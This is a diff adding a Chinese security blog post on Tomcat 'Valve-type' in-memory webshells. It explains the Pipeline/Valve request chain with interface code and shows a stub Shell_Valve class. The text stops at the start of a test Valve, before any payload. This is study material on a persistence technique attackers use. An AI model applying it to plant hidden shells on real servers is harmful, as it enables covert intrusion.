@@ -1,0 +1,1153 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><progress id="content_progress" value="0"></progress><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pig.png">
+  <link rel="icon" href="/img/pig.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#3F4B3B">
+  <meta name="author" content="Piggy Sprint">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="内存马系列---Valve型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存马系列---Valve型">
+<meta property="og:url" content="http://example.com/2026/04/24/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97---Valve%E5%9E%8B/index.html">
+<meta property="og:site_name" content="Piggy Sprint&#39;s blog">
+<meta property="og:description" content="内存马系列---Valve型">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260413155757864.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414161836137.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414163338460.jpeg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414185551882.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414203627279.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414203922712.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414204522561.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414204609492.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414212627373.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414212639355.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414222246304.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414222742350.png">
+<meta property="article:published_time" content="2026-04-24T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-25T14:21:41.290Z">
+<meta property="article:author" content="Piggy Sprint">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260413155757864.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>内存马系列---Valve型 - Piggy Sprint&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+
+
+  
+<link rel="stylesheet" href="/custom/LoadingBar/pace-theme-barber-shop.css">
+<link rel="stylesheet" href="/css/cloudedGlass.css">
+<link rel="stylesheet" href="/custom/ReadingProgress/ReadingProgress.css">
+<link rel="stylesheet" href="/css/Loadanimation.css">
+<link rel="stylesheet" href="/css/StrongInDark.css">
+<link rel="stylesheet" href="/css/TitleNeon.css">
+<link rel="stylesheet" href="/css/TitleGradient.css">
+<link rel="stylesheet" href="/css/ScrollBar.css">
+<link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.1.2/css/all.min.css">
+<link rel="stylesheet" href="/css/CodeBlock.css">
+<link rel="stylesheet" href="/css/CodeInLine.css">
+<link rel="stylesheet" href="/css/RandomBanner.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/Background.css">
+<link rel="stylesheet" href="/css/FrostedGlassBg.css">
+<link rel="stylesheet" href="/css/Sidebar.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":false,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+  <script src="/js/backgroundize.js"></script>
+  <script src="/js/injector.js"></script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
+<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style>
+    <style>
+    .code-expand-btn:not(.expand-done) ~ div.codeblock,
+    .code-expand-btn:not(.expand-done) ~ * div.codeblock {
+      overflow: hidden;
+      height: 360px;
+    }
+    </style>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+   <div id="bg-layer"></div>
+  <div id="loader-container"> 
+    <div id="loader" class="loader"></div>
+    <div class="loader-inner">
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/js/RainbowLoading.js" type="text/javascript"></script>
+<link href="/css/RainbowLoading.css" type="text/css" rel="stylesheet"/>
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"> 🐽🐽 Piggy Sprint &#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/random.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内存马系列---Valve型"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-24 12:00" pubdate>
+          2026年4月24日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内存马系列---Valve型</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#Java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Java内存马系列-06-Tomcat 之 Valve 型内存马 | Drunkbaby’s Blog</a></li>
+<li><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></li>
+<li><a target="_blank" rel="noopener" href="https://bxhhf.github.io/2025/12/07/yuque-hexo-post/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97---Valve%E5%9E%8B/#%E4%BA%94-%E5%B0%8F%E7%BB%93">内存马系列—Valve型 - bxhhf</a></li>
+</ul>
+</blockquote>
+<p>Valve 内存马与之前的三种内存马区别还是有点大的，之前内存马是放在 Web 请求之中的，Listener –&gt; Filter –&gt; Servlet 的流程，但是 Valve 内存马是在 Pipeline 之中的一个流程</p>
+<h1 id="Valve-是什么"><a href="#Valve-是什么" class="headerlink" title="Valve 是什么"></a>Valve 是什么</h1><p>在了解Valve之前，我们先来简单了解一下Tomcat中的<code>管道机制</code>。</p>
+<p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p>
+<p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。</p>
+<p>因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。</p>
+<p>Pipeline 中会有一个最基础的 Valve，这个 Valve 也被称之为 basic，它始终位于末端（最后执行），它在业务上面的表现是封装了具体的请求处理和输出响应。</p>
+<p>Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。这里的调用流程可以类比为Filter中的责任链机制<br>（我们可以在 Filter Chain 当中任意添加 Filter；那么 Valve 也就是可以在 Pipline 当中任意添加）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260413155757864.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>请求像水流一样依次经过管道(Pipeline)上的各个 Valve（阀门），最后被<strong>末端的基础 Valve</strong> 处理并返回响应。（上图的 basic 就是在前文中提到的最基础的 Valve）</p>
+<p>例如：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414161836137.png" srcset="/img/loading.gif" lazyload alt="image-20260414161828977"></p>
+<p>这是获取 HTTP 请求的阶段，也就是这个里面，我们获取到了 Pipeline，并且能够很清楚的看到 Pipeline 里面有一个 basic；这个 basic 所属的类是 <code>StandardEngineValve</code></p>
+<p>流程：</p>
+<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Connector -&gt; Request -&gt; Engine(Pipeline) -&gt; Host(Pipeline) -&gt; Context(Pipeline) -&gt; Wrapper(Pipeline) -&gt; Servlet</span></span></code></pre></div></div></figure>
+
+<p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p>
+<h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><ul>
+<li><p>我们先来看看Pipeline接口，继承了Contained接口</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">interface</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Pipeline</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Contained</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Valve</span><span style="color: #61AFEF"> getBasic</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> setBasic</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Valve</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">valve</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> addValve</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Valve</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">valve</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Valve</span><span style="color: #61AFEF">[] getValves</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> removeValve</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Valve</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">valve</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Valve</span><span style="color: #61AFEF"> getFirst</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">boolean</span><span style="color: #61AFEF"> isAsyncSupported</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> findNonAsyncValves</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Set</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75; font-style: italic">result</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p><code>Pipeline</code>接口提供了各种对<code>Valve</code>的操作方法，如我们可以通过<code>addValve()</code>方法来添加一个Valve。下面我们再来看看Valve接口</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">interface</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Valve</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Valve</span><span style="color: #61AFEF"> getNext</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//获取下一个Valve</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> setNext</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Valve</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">valve</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> backgroundProcess</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> invoke</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Request</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Response</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">)</span></span>
+<span class="line"><span style="color: #61AFEF">        </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">boolean</span><span style="color: #61AFEF"> isAsyncSupported</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p>Valve的调用过程按照顺序调用</p>
+<p>在 Tomcat 的设计中，<code>invoke()</code> 采用了<strong>责任链模式</strong>。当一个请求流经管道（Pipeline）时，Tomcat 会依次调用每个 Valve 的 <code>invoke()</code> 方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414163338460.jpeg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>Valve可以通过重写<code>invoke()</code>方法来实现具体的业务逻辑</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Shell_Valve</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ValveBase</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75"> </span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> invoke</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Request</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Response</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">            ...</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">}</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li>
+</ul>
+<blockquote>
+<p>下面我们通过源码看一看，消息在容器之间是如何传递的。</p>
+</blockquote>
+<ul>
+<li>首先消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中</li>
+</ul>
+<p>  <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414185551882.png" srcset="/img/loading.gif" lazyload alt="image-20260414185551740"></p>
+<p>  先走<code>getService（）</code>获取了<code>StandardService</code></p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414203627279.png" srcset="/img/loading.gif" lazyload alt="image-20260414203627138"></p>
+<p>  接着通过<code>StandardService</code>.<code>getContainer().getPipeline()</code>获取<code>StandardPipeline</code>对象。</p>
+<p>  再通过<code>StandardPipeline.getFirst()</code>获取第一个Valve（<code>StandardEngineValve</code>）</p>
+<p>  然后调用这个<code>StandardEngineValve.invoke</code></p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414203922712.png" srcset="/img/loading.gif" lazyload alt="image-20260414203922546"></p>
+  <figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">host</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPipeline</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getFirst</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(request, response);</span></span></code></pre></div></div></figure>
+
+<p>  通过这个来实现调用后续的Valve、</p>
+<h1 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h1><ul>
+<li><p>Valve 可以被添加进 Pipeline 的流程之后，所以这里我们尝试实现一下。</p>
+<p>先实现基础的 Valve</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #FFFFFF">V</span><span style="color: #C678DD">alue</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.connector.Request</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.connector.Response</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.catalina.valves.ValveBase</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.ServletException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ValveTest</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ValveBase</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> invoke</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Request</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Response</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
